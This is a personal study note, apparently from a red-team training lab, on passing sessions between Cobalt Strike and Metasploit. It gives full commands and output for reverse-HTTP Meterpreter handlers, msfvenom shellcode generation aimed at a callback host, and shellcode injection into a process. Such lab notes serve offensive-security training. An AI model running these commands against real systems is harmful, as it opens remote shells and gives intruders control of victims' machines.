---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Session Passing]]  
___

## Description:  

### Cobalt Strike to Meterpreter

Session passing is a means of spawning payloads that can talk to other Cobalt Strike listeners, or even listeners of entirely different C2 frameworks.

On the Kali VM, launch `msfconsole` and start a new `multi/handler` using the `windows/meterpreter/reverse_http` payload.

```
root@kali:~# msfconsole

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on http://10.10.5.120:8080
```

In Cobalt Strike, go to **Listeners > Add** and set the **Payload** to **Foreign HTTP**. Set the **Host** to **10.10.5.120** (Meterpreter IP), the **Port** to **8080** and click **Save**.

Now to spawn a Meterpreter session from Beacon, simply type `spawn <listener name>`.

```
beacon> spawn metasploit
[*] Tasked beacon to spawn (x86) windows/foreign/reverse_http (10.10.5.120:8080)
```

```
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: ofosht99) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 1 opened (10.10.5.120:8080 -> 10.10.17.231:53951)

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  DEV\bfarmer @ WKSTN-1  10.10.5.120:8080 -> 10.10.17.231:53951 (10.10.17.231)
```

Alternatively, Beacon's `shinject` command can inject any arbitrary shellcode into the specified process. The process can be an existing one, or one we start with the `execute`, `run` or even `shell` commands.

Generate x64 stageless Meterpreter shellcode with `msfvenom`.

```
root@kali:~# msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.120 LPORT=8080 -f raw -o /tmp/msf.bin
```

Ensure the multi handler is setup appropriately and inject the shellcode.

```
beacon> execute C:\Windows\System32\notepad.exe
beacon> ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 1492  4268  notepad.exe                  x64   1           DEV\bfarmer

beacon> shinject 1492 x64 C:\Payloads\msf.bin
```

```
msf6 exploit(multi/handler) > exploit

[*] Started HTTP reverse handler on http://10.10.5.120:8080
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: rumczhno) Redirecting stageless connection from /N1ZSg3AJ641CWUNbIhhT5QWcTIqjJ_npAOt9u8b01bCZLPFvg0YNTQPPZpC2osS8NoHGOLaUyHHR with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: rumczhno) Attaching orphaned/stageless session...
[*] Meterpreter session 2 opened (10.10.5.120:8080 -> 10.10.17.231:53793)
```


### Meterpreter to CobaltStrike
To generate stageless Beacon shellcode, go to `Attacks > Packages > Windows Executable (S)`, select the desired listener, select **Raw** as the **Output** type and select **Use x64 payload**.

Then use the `post/windows/manage/shellcode_inject` module to inject it into a process.


```
msf6 > use post/windows/manage/shellcode_inject
msf6 post(windows/manage/shellcode_inject) > set SESSION 1
msf6 post(windows/manage/shellcode_inject) > set SHELLCODE /tmp/beacon.bin
msf6 post(windows/manage/shellcode_inject) > run

[*] Running module against WKSTN-1
[*] Spawned Notepad process 4560
[+] Successfully injected payload into process: 4560
[*] Post module execution completed
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (09:15 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
